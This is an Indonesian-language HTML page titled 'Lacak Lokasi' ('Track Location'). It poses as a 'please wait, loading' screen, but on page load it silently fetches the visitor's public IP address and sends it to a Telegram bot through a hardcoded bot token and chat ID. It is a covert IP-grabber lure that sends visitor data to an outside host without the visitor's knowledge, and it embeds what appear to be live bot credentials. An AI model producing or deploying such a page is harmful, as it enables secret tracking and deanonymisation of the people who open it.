<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lacak Lokasi</title>
    <script>
        async function getIP() {
            try {
                let response = await fetch("https://api64.ipify.org?format=json");
                let data = await response.json();
                let ip = data.ip;

                // Kirim ke bot Telegram
                let botToken = "7566659804:AAFL6Dn2Vf6zz4HhAvngyyFCXvhULhRVPzg"; // Ganti dengan token bot Anda
                let chatID = "7799140879"; // Ganti dengan ID chat Anda
              
                let message = `üìç IP Baru Terdeteksi: ${ip}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`);

            } catch (error) {
                console.error("Gagal mengambil IP:", error);
            }
        }

        window.onload = getIP;
    </script>
</head>
<body>
    <h1>Mohon Tunggu...</h1>
    <p>Sedang memuat informasi...</p>
</body>
</html>
